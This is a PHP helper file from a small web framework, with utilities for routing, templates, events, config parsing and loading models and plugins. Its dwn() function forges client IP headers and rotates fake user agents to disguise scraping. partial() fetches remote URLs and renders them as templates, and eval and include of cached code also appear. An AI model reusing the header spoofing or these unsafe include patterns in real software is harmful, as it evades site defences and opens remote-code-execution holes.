            // fail if the path is empty
            if (empty($path)) {
                throw new Exception('Path cannot be empty');
            }

            // fail if path is not a string
            if (!is_string($path)) {
                throw new Exception('Path must be a string');
            }

            // remove all leading and trailing delimiters
            $path = trim($path, $delimiter);

            // use current array as the initial value
            $value = $array;

            // extract parts of the path
            $parts = explode($delimiter, $path);

            // loop through each part and extract its value
            foreach ($parts as $part) {
                if (isset($value[$part])) {
                    // replace current value with the child
                    $value = $value[$part];
                } else {
                    // key doesn't exist, fail
                    return $default;
                }
            }

            return $value;
        }
    }

    if (!function_exists('humanize')) {
        function humanize($word, $key)
        {
            return strtolower($word) . str_replace(' ', '', ucwords(str_replace('_', ' ', $key)));
        }
    }

    if (!function_exists('setter')) {
        function setter($key)
        {
            return humanize('set', $key);
        }
    }

    if (!function_exists('getter')) {
        function getter($key)
        {
            return humanize('get', $key);
        }
    }

    if (!function_exists('font')) {
        function font(
            $text = 'OK',
            $font = 'fb82491021a73de6ab8ee73cee1be93d',
            $size = 50,
            $fg = '000000',
            $bg = 'ffffff',
            $width = 700
        ) {
            $url = "http://renderer.fontshop.com/fonts/font_rend.php?idt=f&id=$font&rs=$size&fg=$fg&bg=$bg&rt=$text&ls=$size&w=$width&t=pc";
            $key = sha1(serialize(func_get_args()));
            $file = CACHE_PATH . DS . $key . '.png';
            if (!File::exists($file)) {
                $img = fgc($url);
                file_put_contents($file, $img);
            }

            return URLSITE . 'file.php?file=' . $key . '&type=png&name=image';
        }

        function info($what = null, $die = false)
        {
            if (null === $what) {
                $what = request();
            }
            new Thin\Info($what);
            if (true === $die) {
                exit;
            }
        }

        function lite($name)
        {
            $dbs = container()->getLites();
            $dbs = !Arrays::is($dbs) ? array() : $dbs;
            if (!Arrays::exists($name, $dbs)) {
                $dbFile = STORAGE_PATH . DS . Inflector::lower($name) . '.dbLite';
                $db = new SQLite3($dbFile);
                $dbs[$name] = $db;
                container()->setLites($dbs);
            }
            return $dbs[$name];
        }

        function displayWebAddress($http)
        {
            $http = repl('http://', '', $http);
            $http = repl('https://', '', $http);

            $tab = explode('/', $http);
            return 'http://' . current($tab);
        }

        function getRandomUserAgent()
        {
            $v = rand(1, 4) . '.' . rand(0, 9);
            $a = rand(0, 9);
            $b = rand(0, 99);
            $c = rand(0, 999);

            $userAgents = array(
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; Nexus One Build/FRF91) AppleWebKit/5$b.$c (KHTML, like Gecko) Version/$a.$a Mobile Safari/5$b.$c",
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; Dell Streak Build/Donut AppleWebKit/5$b.$c+ (KHTML, like Gecko) Version/3.$a.2 Mobile Safari/ 5$b.$c.1",
                "Mozilla/5.0 (Linux; U; Android 4.$v; fr-fr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 4.$v; fr-fr; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android $v; en-gb) AppleWebKit/999+ (KHTML, like Gecko) Safari/9$b.$a",
                "Mozilla/5.0 (Linux; U; Android $v.5; fr-fr; HTC_IncredibleS_S710e Build/GRJ$b) AppleWebKit/5$b.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/5$b.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC Vision Build/GRI$b) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v.4; fr-fr; HTC Desire Build/GRJ$b) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v.3; fr-fr; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/5$b.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/5$b.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC_DesireS_S510e Build/GRI$a) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/$c.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
                "Mozilla/5.0 (Linux; U; Android $v.3; fr-fr; HTC Desire Build/GRI$a) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC Desire Build/FRF$a) AppleWebKit/533.1 (KHTML, like Gecko) Version/$a.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/$a.$a Mobile Safari/$c.$a",
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v.1; fr-fr; HTC_DesireZ_A7$c Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/$c.$a",
                "Mozilla/5.0 (Linux; U; Android $v.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/$c.1",
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; LG-P5$b Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
            );

            return $userAgents[rand(0, count($userAgents) - 1)];
        }

        function dwn($url)
        {
            $ip         = rand(0, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(0, 255);
            $userAgent  = getRandomUserAgent();
            $ch         = curl_init();

            $headers    = array();

            curl_setopt($ch, CURLOPT_URL,       $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);

            $headers[] = "REMOTE_ADDR: $ip";
            $headers[] = "HTTP_X_FORWARDED_FOR: $ip";

            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

            $result     = curl_exec($ch);
            curl_close ($ch);
            return $result;
        }
    }

    if (!function_exists('twitter')) {
        function twitter(array $config)
        {
            extract($config);
            $link = 'https://twitter.com/intent/tweet?original_referer=' . urlencode($original_referer) . '&amp;related=' . urlencode($related) . '&amp;text=%22' . urlencode($text) . '%22&amp;tw_p=tweetbutton&url=' . urlencode($url) . '&amp;via=' . urlencode($via);
            return $link;
        }
    }

    if (!function_exists('data')) {

        function newData($type, $data = array())
        {
            return Data::newOne($type);
        }

        function data($type, array $fields, array $config = array())
        {
            if (!empty($fields)) {
                $setter = 'setConfigData' . ucfirst(Inflector::lower($type));
                container()->$setter($config);
                $setter = 'setFieldsData' . ucfirst(Inflector::lower($type));
                $conf = array();
                foreach ($fields as $key => $configField) {
                    if (empty($configField)) {
                        $configField = array("canBeNull" => true);
                    }
                    $conf[$key] = $configField;
                }
                Data::$_fields[$type]     = $fields;
                Data::$_settings[$type]   = $config;
                container()->$setter($fields);
            }
        }
    }

    if (!function_exists('dataDecode')) {
        function dataDecode($file)
        {
            if (File::exists($file)) {
                if (is_readable($file)) {
                    return Data::unserialize(Data::load($file));
                }
            }
            return new Obj;
        }
    }

    if (!function_exists('facebook')) {
        function facebook(array $config)
        {
            extract($config);
            $link = 'http://www.facebook.com/sharer/sharer.php?s=100&amp;p[url]=' . urlencode($url) . '&amp;p[images][0]=' . urlencode($image) . '&amp;p[title]=' . urlencode($title) . '&amp;p[summary]=' . urlencode($summary);
            return $link;
        }
    }

    if (!function_exists('with')) {
        /**
         * Return the given object. Useful for chaining.
         *
         * @param mixed $object
         * @return mixed
         */
        function with($object)
        {
            return $object;
        }
    }

    if (!function_exists('contain')) {
        function contain($needle, $string)
        {
            $needle = Inflector::lower(htmlspecialchars_decode($needle));
            $string = Inflector::lower(htmlspecialchars_decode($string));
            return strstr($string, $needle) ? true : false;
        }
    }

    if (!function_exists('thinVar')) {
        function thinVar()
        {
            static $vars    = array();
            $args           = func_get_args();
            $numArgs        = func_num_args();

            if (1 == $numArgs) {
                if (Arrays::exists(Arrays::first($args), $vars)) {
                    return $vars[Arrays::first($args)];
                }
            } else if (2 == $numArgs) {
                $vars[Arrays::first($args)] = Arrays::last($args);
                return Arrays::last($args);
            }
            return null;
        }

        function setvar($name, $value)
        {
            return thinVar($name, $value);
        }

        function getvar($name)
        {
            return thinVar($name);
        }

        function setEvent($name, $event, $priority = 0)
        {
            $events = container()->getEvents();
            if (null === $events) {
                $events         = array();
                $events[$name]  = array();
            }
            $events[$name][$priority] = $event;
            container()->setEvents($events);
        }

        function runEvent($name, $params = array())
        {
            $res = '';
            $events = container()->getEvents();
            if (null !== $events) {
                if (Arrays::is($events)) {
                    if (Arrays::exists($name, $events)) {
                        if (Arrays::is($events[$name])) {
                            for ($i = 0 ; $i < count($events[$name]) ; $i++) {
                                $func = $events[$name][$i];
                                if ($func instanceof Closure) {
                                    $res .= call_user_func_array($func, $params);
                                }
                            }
                        }
                    }
                }
            }
            return $res;
        }

        if (!function_exists('registry')) {
            function registry()
            {
                static $tab = array();
                $args       = func_get_args();
                $nb         = count($args);

                if ($nb == 1) {
                    return arrayGet($tab, Arrays::first($args));
                } elseif ($nb == 2) {
                    $tab = arraySet($tab, Arrays::first($args), Arrays::last($args));
                    return Arrays::last($args);
                }
                return null;
            }

            function event($name, Closure $closure)
            {
                registry('events.' . $name, $closure);
            }

            function fire($name, $args = array())
            {
                $closure = registry('events.' . $name);
                if (!empty($closure)) {
                    if (is_callable($closure)) {
                        return call_user_func_array($closure, $args);
                    }
                }
                return null;
            }

            function hasEvent($name)
            {
                $closure = registry('events.' . $name);
                if (!empty($closure)) {
                    return $closure instanceof Closure;
                }
                return false;
            }
        }
    }

    if (!function_exists('displays')) {
        function displays($tpl)
        {
            $view   = container()->getView();
            $view   = !is_object($view) ? context()->getView() : $view;
            $tab    = explode(DS, $view->_viewFile);
            $path   = repl(Arrays::last($tab), $tpl, $view->_viewFile);
            if (File::exists($path)) {
                $content = fgc($path);
                $content = repl('$this->', '$view->', View::cleanCode($content));
                $file = CACHE_PATH . DS . sha1($content) . '.display';
                File::put($file, $content);
                ob_start();
                include $file;
                $html = ob_get_contents();
                ob_end_clean();
                File::delete($file);
                echo $html;
            }
        }
    }

    if (!function_exists('tpl')) {
        function tpl($tpl)
        {
            $view   = container()->getView();
            $view   = !is_object($view) ? context()->getView() : $view;
            $tab    = explode(DS, $view->_viewFile);
            $path   = repl(DS . Arrays::last($tab), '', $view->_viewFile);
            $path   = repl($tab[count($tab) - 2], 'partials' . DS . $tpl, $path);

            if (File::exists($path)) {
                $content = fgc($path);
                $content = repl('$this->', '$view->', View::cleanCode($content));
                $file = CACHE_PATH . DS . sha1($content) . '.display';
                File::put($file, $content);
                ob_start();
                include $file;
                $html = ob_get_contents();
                ob_end_clean();
                File::delete($file);
                echo $html;
            }
        }
    }
    if (!function_exists('partial')) {
        function partial($file)
        {
            if (strstr($file, 'http://')) {
                $content = fgc($file);
                $file = CACHE_PATH . DS . sha1($file) . '.html';
                file_put_contents($file, $content);
            }
            if (File::exists($file)) {
                $view = new View($file);
                $view->render();
            }
        }
    }

    if (!function_exists('newObj')) {
        function newObj($class)
        {
            if (!class_exists($class)) {
                class_alias('Thin\\Container', $class);
            }
            return new $class;
        }
    }

    if (!function_exists('createSerializedObject')) {
        function createSerializedObject($className)
        {
            $reflection = new ReflectionClass($className);
            $properties = $reflection->getProperties();

            return "O:" . strlen($className) . ":\"" . $className. "\":" . count($properties) . ':{' . serializeProperties($reflection, $properties) ."}";
        }

        function instantiator($className)
        {
            return unserialize(createSerializedObject($className));
        }

        function serializeProperties(ReflectionClass $reflection, array $properties)
        {
            $serializedProperties = '';

            foreach ($properties as $property) {
                $serializedProperties .= serializePropertyName($reflection, $property);
                $serializedProperties .= serializePropertyValue($reflection, $property);
            }

            return $serializedProperties;
        }

        function serializePropertyName(ReflectionClass $class, ReflectionProperty $property)
        {
            $propertyName = $property->getName();

            if ($property->isProtected()) {
                $propertyName = chr(0) . '*' . chr(0) . $propertyName;
            } elseif ($property->isPrivate()) {
                $propertyName = chr(0) . $class->getName() . chr(0) . $propertyName;
            }

            return serialize($propertyName);
        }

        function serializePropertyValue(ReflectionClass $class, ReflectionProperty $property)
        {
            $defaults = $class->getDefaultProperties();

            if (Arrays::exists($property->getName(), $defaults)) {
                return serialize($defaults[$property->getName()]);
            }

            return serialize(null);
        }

        function callNotPublicMethod($object, $methodName)
        {
            $reflectionClass = new ReflectionClass($object);
            $reflectionMethod = $reflectionClass->getMethod($methodName);
            $reflectionMethod->setAccessible(true);

            $params = array_slice(func_get_args(), 2);
            return $reflectionMethod->invokeArgs($object, $params);
        }

        function transaction($class, $method)
        {
            $transactions = container()->getThinTransactions();
            if (null === $transactions) {
                $transactions = array();
            }
            $params = array_slice(func_get_args(), 2);
            array_push($transactions, array($class, $method, $params));
            container()->setThinTransactions($transactions);
        }

        function commit()
        {
            $transactions = container()->getThinTransactions();
            if (null !== $transactions) {
                if (is_array($transactions)) {
                    if (count($transactions)) {
                        foreach (static::$_transactions as $transaction) {
                            list($class, $method, $params) = $transaction;
                            $commit = call_user_func_array(array($class, $method), $params);
                        }
                    }
                }
            }
        }

        function showException($e)
        {
            $_REQUEST['exception'] = $e;
            return context()->dispatch(with(new Container)->setModule('www')->setController('error')->setAction('index'));


            $code = $e->getCode();
            $file = $e->getFile();
            $line = $e->getLine();
            $date = date('M d, Y h:iA');
            echo '<style>.error {font-weight: bold; color: red; width: 30%; padding: 10px; margin: 10px; border: solid 1px red;}</style>';
            echo "Thin has caught an exception: ";
            $html = "<p>
            <strong>Date:</strong> {$date}
         </p>

         <p>
            <strong>Message:</strong>
            <div class=error>{$e->getMessage()}</div>
         </p>

         <p>
            <strong>Code:</strong> {$code}
         </p>

         <p>
            <strong>File:</strong> {$file}
         </p>

         <p>
            <strong>Line:</strong> {$line}
         </p>

         <h3>Stack trace:</h3>";
         echo $html;
            echo '<pre style="padding: 5px;">';
            echo getExceptionTraceAsString($e);
            echo '</pre>';
        }

        function getExceptionTraceAsString($exception)
        {
            $rtn = "";
            $count = 0;
            foreach ($exception->getTrace() as $frame) {
                $args = "";
                if (isset($frame['args'])) {
                    $args = array();
                    foreach ($frame['args'] as $arg) {
                        if (is_string($arg)) {
                            $args[] = "'" . $arg . "'";
                        } elseif (is_array($arg)) {
                            $args[] = "Array";
                        } elseif (is_null($arg)) {
                            $args[] = 'NULL';
                        } elseif (is_bool($arg)) {
                            $args[] = ($arg) ? "true" : "false";
                        } elseif (is_object($arg)) {
                            $args[] = get_class($arg);
                        } elseif (is_resource($arg)) {
                            $args[] = get_resource_type($arg);
                        } else {
                            $args[] = $arg;
                        }
                    }
                    $args = join(", ", $args);
                }
                if (array_key_exists('file', $frame) && array_key_exists('line', $frame) && array_key_exists('function', $frame)) {
                    $rtn .= sprintf(
                        "#%s %s(%s): %s(%s)\n",
                        $count,
                        $frame['file'],
                        $frame['line'],
                        $frame['function'],
                        $args
                    );
                    $count++;
                }
            }
            return $rtn;
        }
    }

    if (!function_exists('url')) {
        function urlNow()
        {
            $protocol = 'http';
            if ($_SERVER['SERVER_PORT'] == 443
                || (
                    !empty($_SERVER['HTTPS'])
                    && Inflector::lower($_SERVER['HTTPS']) == 'on'
                )) {
                $protocol       .= 's';
                $protocol_port  = $_SERVER['SERVER_PORT'];
            } else {
                $protocol_port  = 80;
            }

            $host       = $_SERVER['HTTP_HOST'];
            $port       = $_SERVER['SERVER_PORT'];
            $request    = $_SERVER['REQUEST_URI'];
            return $protocol . '://' . $host . ($port == $protocol_port ? '' : ':' . $port) . $request;
        }

        function url()
        {
            return context('url');
        }

        function asset()
        {
            return context('asset');
        }
    }

    if (!function_exists('byPeople')) {
        function byPeople($product)
        {
            return (1 == $product->getByPeople()) ? true : false;
        }
    }

    if (!function_exists('getUrl')) {
        function getUrl()
        {
            $urlsite = trim(URLSITE, '/');
            return $urlsite . $_SERVER['REQUEST_URI'];
        }
    }

    if (!function_exists('helper')) {

        function repo($entity)
        {
            $em = Doctrine::em();
            $class = ucfirst(Inflector::uncamelize($entity));
            $file = APPLICATION_PATH . DS . 'models' . DS . 'Doctrine' . DS . preg_replace('#\\\|_(?!.+\\\)#', DS, $class) . '.php';
            if (File::exists($file)) {
                require_once $file;
                return $em->getRepository('\\Thin\\Doctrine' . ucfirst($entity) . 'Entity');
            }
            return null;
        }

        function doctrine($entity)
        {
            $repo = repo($entity);
            $class = '\\Thin\\Doctrine' . ucfirst($entity) . 'Entity';
            return $class;
        }

        function entity()
        {
            return Doctrine::em();
        }

        function helper($helper)
        {
            $file = APPLICATION_PATH . DS . 'helpers' . DS . ucfirst(Inflector::lower($helper)) . '.php';
            if (File::exists($file)) {
                require_once $file;
                $class = 'Thin\\' . ucfirst(Inflector::lower($helper));
                $instance = new $class;
                $methods = get_class_methods($class);
                if (Arrays::in('init', $methods)) {
                    $instance->init();
                }
            }
            return context('helper');
        }
    }

    if (!function_exists('cron')) {
        function cron($args)
        {
            if (php_sapi_name() == 'cli') {
                $script     = array_shift($args);
                $cronName   = array_shift($args);
                $cron       = ucfirst(Inflector::lower($cronName));
                $file       = APPLICATION_PATH . DS . 'crons' . DS . $cron . DS . $cron . 'Cron.php';
                if (File::exists($file)) {
                    require_once $file;
                    $class      = 'Thin\\' . $cron . 'Cron';
                    $instance   = new $class;
                    $methods    = get_class_methods($class);
                    if (Arrays::in('init', $methods)) {
                        $instance->init($args);
                    }
                    return $instance;
                } else {
                    throw new Exception("Cron File $file does not exist.");
                }
            } else {
                throw new Exception("You must call this method in CLI mode.");
            }
        }
    }

    if (!function_exists('bundle')) {

        function getNamespaceAndClassNameFromCode($src)
        {
            $class      = false;
            $namespace  = false;
            $tokens     = token_get_all($src);

            for ($i = 0, $count = count($tokens); $i < $count; $i++) {
                $token = $tokens[$i];

                if (!Arrays::is($token)) {
                    continue;
                }

                if (true === $class && T_STRING === $token[0]) {
                    return array($namespace, $token[1]);
                }

                if (true === $namespace && T_STRING === $token[0]) {
                    $namespace = '';
                    do {
                        $namespace .= $token[1];
                        $token = $tokens[++$i];
                    } while (
                        $i < $count
                        && Arrays::is($token)
                        && Arrays::in(
                            $token[0],
                            array(
                                T_NS_SEPARATOR,
                                T_STRING
                            )
                        )
                    );
                }

                if (T_CLASS === $token[0]) {
                    $class = true;
                }

                if (T_NAMESPACE === $token[0]) {
                    $namespace = true;
                }
            }
            return null;
        }

        function bundle($bundle)
        {
            $bundle = ucfirst(Inflector::lower($bundle));
            $path   = realpath(APPLICATION_PATH . '/../');
            $file   = $path . DS . 'bundles' . DS . $bundle . DS . $bundle . '.php';
            if (File::exists($file)) {
                $getNamespaceAndClassNameFromCode = getNamespaceAndClassNameFromCode(fgc($file));
                if (!is_null($getNamespaceAndClassNameFromCode) && Arrays::is($getNamespaceAndClassNameFromCode)) {
                    list($namespace, $class) = $getNamespaceAndClassNameFromCode;
                    Autoloader::registerNamespace($namespace, $path . DS . 'bundles' . DS . $bundle);
                    require_once $file;
                    $actions = get_class_methods($namespace . '\\' . $class);
                    if (Arrays::in('init', $actions)) {
                        $nsClass = $namespace . '\\' . $class;
                        $nsClass::init();
                    }
                    return true;
                } else {
                    throw new Exception("No namespace found in '$file'.");
                }
            } else {
                throw new Exception("Bundle File '$file' does not exist.");
            }
        }

        function loadIni($filename, $section = null)
        {
            if (empty($filename) || !is_readable($filename)) {
                throw new Exception('Filename is not readable');
            }

            $allowModifications = false;
            $iniArray           = parse_ini_file($filename, true);

            if (null === $section) {
                // Load entire file
                $dataArray = array();
                foreach ($iniArray as $sectionName => $sectionData) {
                    if(!Arrays::is($sectionData)) {
                        $dataArray = arrayMergeRecursive(
                            $dataArray,
                            processKey(
                                array(),
                                $sectionName,
                                $sectionData
                            )
                        );
                    } else {
                        $dataArray[$sectionName] = processSection($iniArray, $sectionName);
                    }
                }
            } else {
                // Load one or more sections
                if (!Arrays::is($section)) {
                    $section = array($section);
                }
                $dataArray = array();
                foreach ($section as $sectionName) {
                    if (!isset($iniArray[$sectionName])) {
                        throw new Exception("Section '$sectionName' cannot be found in $filename");
                    }
                    $dataArray = arrayMergeRecursive(
                        processSection(
                            $iniArray,
                            $sectionName
                        ),
                        $dataArray
                    );
                }
            }
            return $dataArray;
        }

        function processSection($iniArray, $section, $config = array())
        {
            $thisSection = $iniArray[$section];
            foreach ($thisSection as $key => $value) {
                $config = processKey($config, $key, $value);
            }
            return $config;
        }

        function processKey($config, $key, $value, $separator = '.')
        {
            if (strpos($key, $separator) !== false) {
                $parts = explode($separator, $key, 2);
                if (strlen(Arrays::first($parts)) && strlen(Arrays::last($parts))) {
                    if (!isset($config[Arrays::first($parts)])) {
                        if (Arrays::first($parts) === '0' && !empty($config)) {
                            $config = array(Arrays::first($parts) => $config);
                        } else {
                            $config[Arrays::first($parts)] = array();
                        }
                    } elseif (!Arrays::is($config[Arrays::first($parts)])) {
                        throw new Exception("Cannot create sub-key for '{Arrays::first($parts)}' as key already exists");
                    }
                    $config[Arrays::first($parts)] = processKey(
                        $config[Arrays::first($parts)],
                        Arrays::last($parts),
                        $value
                    );
                } else {
                    throw new Exception("Invalid key '$key'");
                }
            } else {
                $config[$key] = $value;
            }
            return $config;
        }

        function arrayMergeRecursive($firstArray, $secondArray)
        {
            if (Arrays::is($firstArray) && Arrays::is($secondArray)) {
                foreach ($secondArray as $key => $value) {
                    if (isset($firstArray[$key])) {
                        $firstArray[$key] = arrayMergeRecursive($firstArray[$key], $value);
                    } else {
                        if($key === 0) {
                            $firstArray = array(
                                0 => arrayMergeRecursive(
                                    $firstArray,
                                    $value
                                )
                            );
                        } else {
                            $firstArray[$key] = $value;
                        }
                    }
                }
            } else {
                $firstArray = $secondArray;
            }
            return $firstArray;
        }
    }

    if (!function_exists('service')) {
        function service($service)
        {
            $file = APPLICATION_PATH . DS . 'services' . DS . ucfirst(Inflector::lower($service)) . '.php';
            if (File::exists($file)) {
                require_once $file;
                $class = 'Thin\\' . ucfirst(Inflector::lower($service)) . 'Service';
                $instance = new $class;
                $methods = get_class_methods($class);
                if (Arrays::in('init', $methods)) {
                    $instance->init();
                }
            }
            return context('service');
        }
    }

    if (!function_exists('arrayCollection')) {
        function collection()
        {
            return with(new \Doctrine\Common\Collections\ArrayCollection);
        }
    }

    if (!function_exists('plugin')) {
        function plugin($plugin)
        {
            $file = APPLICATION_PATH . DS . 'plugins' . DS . ucfirst(Inflector::lower($plugin)) . '.php';
            if (File::exists($file)) {
                require_once $file;
                $class = 'Thin\\' . ucfirst(Inflector::lower($plugin)) . 'Plugin';
                $instance = new $class;
                $methods = get_class_methods($class);
                if (Arrays::in('init', $methods)) {
                    $instance->init();
                }
            }
            return context('plugin');
        }
    }

    if (!function_exists('model')) {
        function model($model, $database = 'db')
        {
            $file = APPLICATION_PATH . DS . 'models' . DS . ucfirst(Inflector::lower($model)) . '.php';
            if (File::exists($file)) {
                require_once $file;
                $class = 'Thin\\' . ucfirst(Inflector::lower($model)) . 'Model';
                $instance = new $class;
                $methods = get_class_methods($class);
                if (Arrays::in('init', $methods)) {
                    $instance->init();
                }
            }
            return db($database)->model(Inflector::lower($model));
        }
    }

    if (!function_exists('eloquent')) {
        function eloquent($model)
        {
            $file = APPLICATION_PATH . DS . 'models' .DS . 'Eloquent' . DS . ucfirst(Inflector::lower($model)) . '.php';
            if (File::exists($file)) {
                require_once $file;
                $class = 'Thin\\' . ucfirst(Inflector::lower($model)) . 'Eloquent';
                $instance = new $class;
                $methods = get_class_methods($class);
                if (Arrays::in('init', $methods)) {
                    $instance->init();
                }
            }
            return $instance;
        }
    }

    if (!function_exists('isPhp')) {
        function isPhp($version = '5.4.0')
        {
            static $_isPhp;
            $version = (string) $version;

            if (!Arrays::exists($version, $_isPhp)) {
                $_isPhp[$version] = (version_compare(PHP_VERSION, $version) < 0) ? false : true;
            }

            return $_isPhp[$version];
        }
    }

    if (!function_exists('setHeaderStatus')) {
        function setHeaderStatus($code = 200, $text = '')
        {
            $stati = array(
                200 => 'OK',
                201 => 'Created',
                202 => 'Accepted',
                203 => 'Non-Authoritative Information',
                204 => 'No Content',
                205 => 'Reset Content',
                206 => 'Partial Content',

                300 => 'Multiple Choices',
                301 => 'Moved Permanently',
                302 => 'Found',
                304 => 'Not Modified',
                305 => 'Use Proxy',
                307 => 'Temporary Redirect',

                400 => 'Bad Request',
                401 => 'Unauthorized',
                403 => 'Forbidden',
                404 => 'Not Found',
                405 => 'Method Not Allowed',
                406 => 'Not Acceptable',
                407 => 'Proxy Authentication Required',
                408 => 'Request Timeout',
                409 => 'Conflict',
                410 => 'Gone',
                411 => 'Length Required',
                412 => 'Precondition Failed',
                413 => 'Request Entity Too Large',
                414 => 'Request-URI Too Long',
                415 => 'Unsupported Media Type',
                416 => 'Requested Range Not Satisfiable',
                417 => 'Expectation Failed',

                500 => 'Internal Server Error',
                501 => 'Not Implemented',
                502 => 'Bad Gateway',
                503 => 'Service Unavailable',
                504 => 'Gateway Timeout',
                505 => 'HTTP Version Not Supported'
            );

            if ($code == '' || ! is_numeric($code)) {
                throw new Exception('Status codes must be numeric');
            }

            if (isset($stati[$code]) && $text == '') {
                $text = $stati[$code];
            }

            if ($text == '') {
                throw new Exception('No status text available.  Please check your status code number or supply your own message text.');
            }

            $serverProtocol = (isset($_SERVER['SERVER_PROTOCOL'])) ? $_SERVER['SERVER_PROTOCOL'] : false;

            if (substr(php_sapi_name(), 0, 3) == 'cgi') {
                header("Status: {$code} {$text}", true);
            } elseif ($serverProtocol == 'HTTP/1.1' || $serverProtocol == 'HTTP/1.0') {
                header($serverProtocol . " {$code} {$text}", true, $code);
            } else {
                header("HTTP/1.1 {$code} {$text}", true, $code);
            }
        }
    }

    if (!function_exists('nosql')) {
        function nosql($ns, $table)
        {
            return container()->nbm($table, $ns);
        }
    }

    if (!function_exists('get_content_type')) {
        function get_content_type($file)
        {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if (strlen($ext)) {
                switch ($ext) {
                    case 'xml': return 'text/xml';
                    case 'atom': return 'application/atom+xml';
                    case 'txt': return 'text/plain';
                    case 'html': return 'text/html';
                    case 'rss': return 'application/rss+xml; charset=UTF-8';
                    case 'pdf': return 'application/pdf';
                    case 'doc': return 'application/msword';
                    case 'xls': return 'application/msexcel';
                    case 'json': return 'application/json';
                    case 'jpeg': case 'jpg' : return 'image/jpeg';
                    case 'gif': return 'image/gif';
                    case 'png': return 'image/png';
                    case 'bmp': return 'image/bmp';
                    case 'js': return 'text/javascript';
                    case 'css': return 'text/css';
                    case 'less': return 'text/less';
                    default: return 'text/html';
                }
            }
            return 'text/html';
        }
    }

    if (!function_exists('extension')) {
        function extension($file)
        {
            return strtolower(pathinfo($file, PATHINFO_EXTENSION));
        }
    }

    if (!function_exists('email')) {
        function email()
        {
            if (!class_exists('ThinEmail')) {
                eval('class ThinEmail extends Thin\\Container {public function send(){return Thin\\Utils::mail(parent::getTo(), parent::getSubject(), parent::getBody(), parent::getHeaders());}}');
            }
            return new ThinEmail;
        }

        function smtp($to, $from, $subject, $body, $html = true)
        {
            $mail = new Smtp();
            $mail->to($to)->from($from)->subject($subject);
            if (true === $html) {
                $result = $mail->body($body)->send();
            } else {
                $result = $mail->text($body)->sendText();
            }
            return $result;
        }
    }

    if (!function_exists('config')) {
        /* ex: config('app.encoding');*/
        function config()
        {
            $args = func_get_args();
            if (!count($args)) {
                return container()->getConfig();
            }
            if (1 == count($args)) {
                $getter = getter(Arrays::first($args));
                return container()->getConfig()->$getter();
            }
            if (2 == count($args)) {
                $key    = Arrays::first($args);
                $value  = Arrays::last($args);
                $setter = setter($key);
                container()->getConfig()->$setter($value);
                return $value;
            }
            return null;
        }

        function conf($conf = null)
        {
            if (!is_null($conf)) {
                $file = APPLICATION_PATH . DS . 'config' . DS . Inflector::lower($conf) . '.php';
                if (File::exists($file)) {
                    return include $file;
                }
            }
            return context('config');
        }
    }

    if (!function_exists('hook')) {
        function hook($hook = null)
        {
            if (!is_null($hook)) {
                $file = APPLICATION_PATH . DS . 'hooks' . DS . ucfirst(Inflector::lower($hook)) . '.php';
                if (File::exists($file)) {
                    require_once $file;
                    $class = 'Thin\\' . ucfirst(Inflector::lower($hook));
                    $instance = new $class;
                    $instance->init();
                }
            }
            return context('hooks');
        }
    }

    if (!function_exists('auth')) {
        function auth($id = null)
        {
            return new \AuthBundle\Auth($id);
        }
    }

    if (!function_exists('hr')) {
        function hr($str = null)
        {
            $str = is_null($str) ? '&nbsp;' : $str;
            echo $str . '<hr />';
        }
    }

    if (!function_exists('addEav')) {
        function addEav($entity, array $attributes)
        {
